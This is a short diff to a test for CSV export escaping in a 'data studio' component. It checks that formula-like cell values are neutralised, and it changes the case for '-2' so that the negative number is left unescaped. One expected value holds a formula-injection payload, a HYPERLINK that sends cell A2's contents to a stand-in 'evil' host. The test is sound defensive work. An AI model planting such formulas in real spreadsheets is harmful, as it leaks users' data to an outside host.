@@ -83,7 +83,7 @@ describe('data studio', () => {
     expect(lines[1]).toBe(`Ada,"'=HYPERLINK(""http://evil/?""&A2,""x"")"`);
     expect(lines[2]).toBe("Bob,'+SUM(1;2)");
     expect(lines[3]).toBe("Cy,'@x");
-    expect(lines[4]).toBe("Di,'-2");
+    expect(lines[4]).toBe('Di,-2');
     expect(lines[5]).toBe("Ed,'\tx");
     expect(csv).toContain(`Fa,"a\rb"`);
     expect(lines.at(-1)).toBe('Gi,plain');
